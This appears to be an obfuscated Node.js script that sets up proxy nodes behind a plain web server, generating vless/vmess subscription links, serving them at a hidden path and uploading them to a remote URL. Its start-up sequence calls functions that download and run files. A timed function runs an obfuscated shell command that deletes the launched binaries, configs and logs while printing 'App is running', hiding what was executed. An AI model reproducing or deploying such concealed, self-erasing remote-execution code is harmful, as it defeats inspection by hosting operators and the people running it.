axios[_0x496d35(_0x398fda._0x59b677)](_0x496d35(_0x398fda._0x3489c0),{'headers':{'User-Agent':'Mozilla/5.0','timeout':0xbb8}});if(_0x46e605[_0x496d35(_0x398fda._0x4bb835)]&&_0x46e605[_0x496d35(_0x398fda._0x3bfd0a)][_0x496d35(_0x398fda._0x4fb1a5)]==='success'&&_0x46e605[_0x496d35(0x122)][_0x496d35(_0x398fda._0x2d4190)]&&_0x46e605[_0x496d35(0x122)][_0x496d35(0x11d)])return(_0x46e605[_0x496d35(_0x398fda._0x3bfd0a)][_0x496d35(0xf0)]+'-'+_0x46e605[_0x496d35(_0x398fda._0x188556)][_0x496d35(_0x398fda._0x5c4f84)])[_0x496d35(0x14d)](/\s+/g,'_');}catch(_0x11957d){}}return _0x496d35(0xcb);}async function _0x10aed1(_0x275817){const _0x25fd67={_0x33df96:0x126,_0x289661:0xd2,_0x299527:0x166,_0x501f73:0x113,_0x2509f9:0x119,_0x3c1ca7:0x15d,_0x558127:0x13e,_0x221a4e:0xca,_0x3a86e2:0xb6},_0x49fa5f=await _0x149496(),_0x29f41c=NAME?NAME+'-'+_0x49fa5f:_0x49fa5f;return new Promise(_0x121994=>{const _0xd6fc3d={_0x5e6b31:0xa4,_0xa1f7c4:0x161};setTimeout(()=>{const _0x1f37ed=_0xff08,_0x13035d={'v':'2','ps':''+_0x29f41c,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1f37ed(0xe5),'net':'ws','type':_0x1f37ed(0xd4),'host':_0x275817,'path':_0x1f37ed(0xe0),'tls':_0x1f37ed(0x120),'sni':_0x275817,'alpn':'','fp':'firefox'},_0x4e5361=_0x1f37ed(_0x25fd67._0x33df96)+UUID+'@'+CFIP+':'+CFPORT+_0x1f37ed(_0x25fd67._0x289661)+_0x275817+_0x1f37ed(0x10a)+_0x275817+_0x1f37ed(_0x25fd67._0x299527)+_0x29f41c+_0x1f37ed(_0x25fd67._0x501f73)+Buffer['from'](JSON[_0x1f37ed(_0x25fd67._0x2509f9)](_0x13035d))[_0x1f37ed(0xae)](_0x1f37ed(_0x25fd67._0x3c1ca7))+_0x1f37ed(_0x25fd67._0x558127)+UUID+'@'+CFIP+':'+CFPORT+_0x1f37ed(_0x25fd67._0x221a4e)+_0x275817+'&fp=firefox&type=ws&host='+_0x275817+_0x1f37ed(0x146)+_0x29f41c+_0x1f37ed(0xde);console[_0x1f37ed(0x140)](Buffer[_0x1f37ed(0xa4)](_0x4e5361)['toString'](_0x1f37ed(_0x25fd67._0x3c1ca7))),fs[_0x1f37ed(0xfd)](subPath,Buffer[_0x1f37ed(0xa4)](_0x4e5361)[_0x1f37ed(0xae)](_0x1f37ed(0x15d))),console[_0x1f37ed(0x140)](FILE_PATH+_0x1f37ed(0x104)),uploadNodes(),app[_0x1f37ed(_0x25fd67._0x3a86e2)]('/'+SUB_PATH,(_0xe16009,_0x2303e5)=>{const _0x432c3a=_0x1f37ed,_0x102595=Buffer[_0x432c3a(_0xd6fc3d._0x5e6b31)](_0x4e5361)[_0x432c3a(0xae)]('base64');_0x2303e5[_0x432c3a(_0xd6fc3d._0xa1f7c4)](_0x432c3a(0x123),_0x432c3a(0x160)),_0x2303e5[_0x432c3a(0x117)](_0x102595);}),_0x121994(_0x4e5361);},0x7d0);});}}function _0xff08(_0x1b9f4c,_0x187ef0){const _0x377885=_0x3778();return _0xff08=function(_0xff08f5,_0x500be5){_0xff08f5=_0xff08f5-0x99;let _0x3ec432=_0x377885[_0xff08f5];return _0x3ec432;},_0xff08(_0x1b9f4c,_0x187ef0);}async function uploadNodes(){const _0x2e1d41={_0x122351:0x162,_0x2aa87f:0x10c,_0x10d1bb:0x13f,_0x382ad6:0x150,_0x28fc9c:0x112,_0x4071e7:0x154,_0x17a30e:0xdc,_0x3c694a:0x10c,_0x2cb7d9:0x140},_0x1c671b=_0x3e978b;if(UPLOAD_URL&&PROJECT_URL){const _0x1135f8=PROJECT_URL+'/'+SUB_PATH,_0x622b41={'subscription':[_0x1135f8]};try{const _0x150d99=await axios[_0x1c671b(_0x2e1d41._0x122351)](UPLOAD_URL+_0x1c671b(0x124),_0x622b41,{'headers':{'Content-Type':_0x1c671b(_0x2e1d41._0x2aa87f)}});return _0x150d99&&_0x150d99['status']===0xc8?(console[_0x1c671b(0x140)]('Subscription\x20uploaded\x20successfully'),_0x150d99):null;}catch(_0x198d9c){if(_0x198d9c[_0x1c671b(0x13f)]){if(_0x198d9c[_0x1c671b(_0x2e1d41._0x10d1bb)][_0x1c671b(0xd1)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1c671b(_0x2e1d41._0x382ad6)](listPath))return;const _0x54f46d=fs['readFileSync'](listPath,_0x1c671b(_0x2e1d41._0x28fc9c)),_0xb0e4d5=_0x54f46d[_0x1c671b(_0x2e1d41._0x4071e7)]('\x0a')[_0x1c671b(_0x2e1d41._0x17a30e)](_0x42fb24=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x42fb24));if(_0xb0e4d5[_0x1c671b(0xf4)]===0x0)return;const _0x2c436d=JSON[_0x1c671b(0x119)]({'nodes':_0xb0e4d5});try{const _0x27e0fb=await axios[_0x1c671b(0x162)](UPLOAD_URL+_0x1c671b(0x15c),_0x2c436d,{'headers':{'Content-Type':_0x1c671b(_0x2e1d41._0x3c694a)}});return _0x27e0fb&&_0x27e0fb[_0x1c671b(0xd1)]===0xc8?(console[_0x1c671b(_0x2e1d41._0x2cb7d9)](_0x1c671b(0xad)),_0x27e0fb):null;}catch(_0x12c662){return null;}}else return;}}function cleanFiles(){const _0x13f3f3={_0x2959ff:0x167,_0xd7f4a9:0xf1,_0x1d36e1:0xb0,_0x3a7e5d:0xf1},_0x5d2c86={_0x415e2d:0xef,_0x4982e3:0x140};setTimeout(()=>{const _0x326b83={_0x147c18:0xef,_0xa1975e:0x140,_0x78bbca:0x13b},_0x261079=_0xff08,_0x42bc56=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x42bc56[_0x261079(0xcd)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x42bc56[_0x261079(0xcd)](phpPath);process[_0x261079(0xaa)]===_0x261079(0xea)?exec(_0x261079(_0x13f3f3._0x2959ff)+_0x42bc56[_0x261079(_0x13f3f3._0xd7f4a9)]('\x20')+'\x20>\x20nul\x202>&1',_0x3b7521=>{const _0x1740ba=_0x261079;console[_0x1740ba(_0x5d2c86._0x415e2d)](),console['log'](_0x1740ba(0x9c)),console[_0x1740ba(_0x5d2c86._0x4982e3)](_0x1740ba(0x13b));}):exec(_0x261079(_0x13f3f3._0x1d36e1)+_0x42bc56[_0x261079(_0x13f3f3._0x3a7e5d)]('\x20')+_0x261079(0xbc),_0x3a989e=>{const _0x419aae=_0x261079;console[_0x419aae(_0x326b83._0x147c18)](),console[_0x419aae(0x140)]('App\x20is\x20running'),console[_0x419aae(_0x326b83._0xa1975e)](_0x419aae(_0x326b83._0x78bbca));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x244a51={_0x51bbe4:0x140,_0xdcd78c:0xe1,_0x28a499:0xc0,_0x65fb5b:0x10c,_0x14813b:0x168},_0x13f5dd=_0x3e978b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x13f5dd(_0x244a51._0x51bbe4)](_0x13f5dd(_0x244a51._0xdcd78c));return;}try{const _0x1e0302=await axios['post'](_0x13f5dd(_0x244a51._0x28a499),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x13f5dd(_0x244a51._0x65fb5b)}});return console[_0x13f5dd(0x140)](_0x13f5dd(0xf3)),_0x1e0302;}catch(_0x3964fd){return console[_0x13f5dd(0x15e)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x3964fd[_0x13f5dd(_0x244a51._0x14813b)]),null;}}async function startserver(){const _0x4ffca0=_0x3e978b;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4352ac){console['error'](_0x4ffca0(0xdb),_0x4352ac);}}startserver()['catch'](_0x58677e=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x58677e);}),app[_0x3e978b(0xb6)]('/',async function(_0x246de0,_0x2d3d4b){const _0x26091f={_0x1008e2:0xf1,_0x1a5543:0xf5,_0x25bdbc:0xb2,_0x3c4c5b:0x99,_0x544b01:0xd3,_0x407a4c:0xa5},_0x1d8900=_0x3e978b;try{const _0x3cc364=path[_0x1d8900(_0x26091f._0x1008e2)](__dirname,_0x1d8900(_0x26091f._0x1a5543)),_0x1f58cd=await fs[_0x1d8900(_0x26091f._0x25bdbc)][_0x1d8900(_0x26091f._0x3c4c5b)](_0x3cc364,_0x1d8900(_0x26091f._0x544b01));_0x2d3d4b['send'](_0x1f58cd);}catch(_0x81f70b){_0x2d3d4b['send'](_0x1d8900(_0x26091f._0x407a4c));}}),app[_0x3e978b(0xf7)](PORT,()=>console[_0x3e978b(0x140)](_0x3e978b(0x14e)+PORT+'!'));
